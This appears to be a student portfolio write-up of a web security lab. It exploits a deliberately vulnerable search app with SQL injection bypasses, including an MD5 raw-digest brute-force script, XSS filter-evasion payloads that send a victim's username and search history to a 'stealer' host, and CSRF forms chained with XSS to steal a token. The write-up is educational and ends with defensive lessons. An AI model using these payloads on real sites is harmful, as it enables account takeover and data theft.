# Web Application Security Research

A comprehensive exploration of web application vulnerabilities, attack techniques, and defense bypass methods across three critical vulnerability classes: SQL Injection, Cross-Site Scripting (XSS), and Cross-Site Request Forgery (CSRF).

**Educational Purpose**: All techniques demonstrated here are for authorized security research and learning in controlled environments.

---

## Lab: Browser DevTools & Web Reconnaissance

Built a foundation in browser-based security analysis using Firefox DevTools — essential skills for understanding how web vulnerabilities are discovered and exploited.

### Hidden Content Discovery
- Used Firefox Page Inspector to locate sensitive data embedded in HTML comments
- Demonstrated how information disclosure vulnerabilities arise from developer oversights
- Extracted hidden metadata invisible to casual users but accessible through browser tooling

### Cookie Security Analysis
Examined HTTP cookies for critical security misconfigurations:

| Attribute | Purpose | Missing = Vulnerable To |
|-----------|---------|------------------------|
| `HttpOnly` | Blocks JavaScript access | XSS-based cookie theft |
| `Secure` | HTTPS-only transmission | Network interception |
| `SameSite` | Restricts cross-origin requests | CSRF attacks |

### DOM Traversal & Element Selection
Used Firefox Web Console to programmatically interact with page elements:

```javascript
// Class-based selection
document.getElementsByClassName("state")        // HTMLCollection

// Tag-based selection  
document.getElementsByTagName("h1")             // HTMLCollection

// Child traversal by index
document.getElementById("counties").children[2] // Specific child element
```

**Key Takeaway**: DOM traversal skills are foundational to crafting precise XSS payloads that extract specific user data from web applications.

[Lab Write-Up](https://docs.google.com/document/d/1JEblKEZQNZsGru4TwU3zvu4iZ75BqEtuYNn0fe5wdb0/edit?usp=sharing)

---

## Project: Web Application Penetration Testing

Full security evaluation of a deliberately vulnerable web search application, exploiting three attack classes across multiple defense levels.

---

## Part 1: SQL Injection

Exploited unsanitized database query construction to authenticate as arbitrary users without knowing their passwords.

**Underlying vulnerability**:
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

### 1.0 — No Defenses
Injected an `OR` clause through the password field, targeting the victim row specifically without requiring their password:

```
username=victim
password=x' OR username='victim
```

The server's trailing quote closed the injected string cleanly — no comment character needed.

### 1.1 — Single Quote Escaping
The defense replaced `'` with `''`. Bypass used a backslash in the username to "swallow" the escaped quote, merging both fields into one string context. The password injection then executed outside that merged string using hex encoding to avoid quotes entirely:

```
username=\
password=\'' OR username=0x76696374696d#
```

`0x76696374696d` = `victim` in hex — no quotes required.

### 1.2 — Escaping + MD5 Hashing
The most sophisticated defense — passwords were MD5-hashed before query construction:

```python
password_digest = md5(password_bytes).digest().decode("latin-1")
query = "... AND password='" + password_digest + "'"
```

**Key insight**: `md5().digest()` returns raw bytes decoded as latin-1. Since latin-1 maps bytes 1:1 to characters, the digest may contain `0x27` — a literal single quote — breaking out of the SQL string context.

A brute-force script searched for a password whose MD5 digest contained `'[valid SQL]#`:

```python
def hash_contains_injection(digest: bytes) -> bool:
    decoded = digest.decode("latin-1")
    for i, ch in enumerate(decoded):
        if ch != "'":
            continue
        for j in range(i + 1, len(decoded)):
            between = decoded[i + 1:j]
            if decoded[j] == "#" and between and all(c in VALID_SQL_CHARS for c in between):
                return True
            if decoded[j:j+3] == "-- " and between and all(c in VALID_SQL_CHARS for c in between):
                return True
    return False
```

A working password was found in ~5.3 million iterations and verified against the live endpoint.

---

## Part 2: Cross-Site Scripting (XSS)

Exploited unsanitized search input reflected back into the page HTML to execute JavaScript in the victim's browser context.

**Payload objective**: Silently exfiltrate the victim's username and most recent search to an attacker-controlled server — no visible redirect, no user interaction.

```javascript
// Silent background GET request using jQuery — page stays intact
window.onload = function() {
    var user = document.getElementById("logged-in-user").textContent;
    var last = document.getElementById("history-list").children[1].textContent;
    $.get("http://stealer:31337/?stolen_user=" + encodeURIComponent(user) 
        + "&last_search=" + encodeURIComponent(last));
}
```

`$.get()` was chosen specifically because it sends a background AJAX request without redirecting the page, making the attack invisible to the victim.

### 2.0 — No Defenses
Standard `<script>` tag injection with `window.onload` to ensure DOM readiness before element access.

### 2.1 — Remove "script"
The defense stripped the word `script` using regex. Bypass embedded `script` inside itself — after filtering, a valid tag remained:

```
<scrscriptipt>...</scrscriptipt>
→ after filter: <script>...</script>
```

### 2.2 — Remove Several Tags
The defense blocked `<script>`, `<img>`, `<body>`, `<style>`, `<meta>`, `<embed>`, `<object>`. Bypass used `<svg>` with an `onload` handler — not on the blocklist, and executing in the same page context as the parent document:

```html
<svg onload="...payload...">
```

### 2.3 — Remove Semicolons and Quotes
The defense stripped `;`, `'`, and `"`. Bypass used JavaScript **template literals** (backticks) as string delimiters and chained statements via assignment rather than semicolons:

```html
<svg onload=$.get(`http://stealer:31337/?stolen_user=`
    +encodeURIComponent(document.getElementById(`logged-in-user`).textContent)
    +`&last_search=`
    +encodeURIComponent(document.getElementById(`history-list`).children[1].textContent))>
```

---

## Part 3: Cross-Site Request Forgery (CSRF)

Exploited the browser's automatic inclusion of session cookies in cross-origin requests to silently log the victim into an attacker-controlled account.

### 3.0 — No Defenses
A hidden auto-submitting form targeting the login endpoint, submitted into a hidden iframe to prevent any visible page change:

```html
<iframe name="hidden" style="display:none"></iframe>
<form id="f" method="post"
  action="https://webproject.gtinfosec.org/login?csrfdefense=0&xssdefense=4"
  target="hidden">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="l33th4x">
</form>
<script>document.getElementById("f").submit()</script>
```

### 3.1 — CSRF Token Validation
The server generated a random 16-byte `csrf_token` and required it as a hidden form field. Since the token was session-dependent and random, it could not be hardcoded.

**Bypass**: Chained the XSS vulnerability from Part 2 to read the token from within BuzzBuzzGo's own origin — bypassing the Same-Origin Policy — then programmatically submitted the login form with the extracted token:

```javascript
// XSS payload reads csrf_token cookie and submits authenticated login form
var t = document.cookie.match(/csrf_token=([^;]+)/)[1];
var f = document.createElement('form');
f.method = 'POST';
f.action = 'https://webproject.gtinfosec.org/login?csrfdefense=1&xssdefense=0';
var u = document.createElement('input'); u.name = 'username'; u.value = 'attacker'; f.appendChild(u);
var p = document.createElement('input'); p.name = 'password'; p.value = 'l33th4x'; f.appendChild(p);
var c = document.createElement('input'); c.name = 'csrf_token'; c.value = t; f.appendChild(c);
document.body.appendChild(f); f.submit();
```

This demonstrates how a single XSS vulnerability can completely undermine token-based CSRF protection.

---

## Technical Stack

**Languages**: Python 3, JavaScript, HTML, SQL  
**Tools**: Firefox DevTools, GDB, Python `hashlib` & `requests`  
**Environment**: Docker (Firefox 128, isolated network), VS Code Remote Containers  
**Target Stack**: Python/Bottle framework, MySQL database

---

## Key Learnings

### Blocklist Filtering Always Fails
Every defense in Part 2 used a blocklist approach — filtering known bad patterns. Each was bypassed through encoding tricks, alternative tags, or non-standard syntax. The only reliable XSS defense is strict output encoding combined with Content Security Policy (CSP).

### Hashing ≠ Safe Query Construction
MD5-hashing a password before inserting it into a raw SQL string does not prevent injection — it simply shifts the attack surface. The hash output itself becomes the injection vector. Parameterized queries are the only correct solution.

### XSS Breaks All Other Defenses
CSRF token validation is a strong defense in isolation. But a single XSS vulnerability allows an attacker to read the token directly from the DOM, rendering it useless. Defense in depth requires that XSS be eliminated before relying on CSRF tokens.

### The Same-Origin Policy Has Limits
SOP prevents reading cross-origin responses but does not prevent sending cross-origin requests. This asymmetry is the root cause of CSRF — browsers will send cookies to any domain, regardless of which page initiated the request.

---

## Ethical Notice

This work was completed in a controlled educational environment against deliberately vulnerable targets provided for security research purposes. All techniques should only be applied in authorized environments.
